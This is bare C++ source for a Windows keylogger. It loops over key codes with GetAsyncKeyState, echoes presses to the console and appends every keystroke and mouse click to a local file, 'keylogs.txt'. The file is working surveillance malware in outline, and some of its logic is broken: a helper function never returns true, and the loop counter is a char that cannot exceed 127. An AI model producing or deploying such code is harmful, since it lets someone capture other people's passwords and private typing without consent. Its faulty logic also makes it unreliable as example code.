#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void WriteToLog(LPCSTR text) {
	ofstream logfile;
	logfile.open("keylogs.txt", fstream::app);
	logfile << text; //writes txt to file
	logfile.close(); //closes stream
}

bool KeyIsListed(int iKey) {
	switch (iKey) {
	case VK_SPACE:
		cout << " "; //if space bar is pressed, print space to console
		WriteToLog(" ");  // write space to logfile
		break;
	case VK_RETURN:
		cout << "\n";
		WriteToLog("\n");
		break;
	case VK_SHIFT:
		cout << " *Shift* ";
		WriteToLog(" *Shift* ");
		break;
	case VK_BACK:
		cout << "\b"; 
		WriteToLog("\b");
		break;
	case VK_RBUTTON:
		cout << " *rclick* ";
		WriteToLog(" *rclick* ");
		break;
	case VK_LBUTTON:
		cout << " *lclick* ";
		WriteToLog(" *lclick* ");
		break;
	default: return false;
	}
}

int main() {
	char key;
	while (TRUE) {
		Sleep(10);
		for (key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (KeyIsListed(key) == FALSE) {
					cout << key;
					ofstream logfile;
					logfile.open("keylogs.txt", fstream::app);
					logfile << key; //writes txt to file
					logfile.close(); //closes stream
				}
			}
		}
	}
	return 0;
}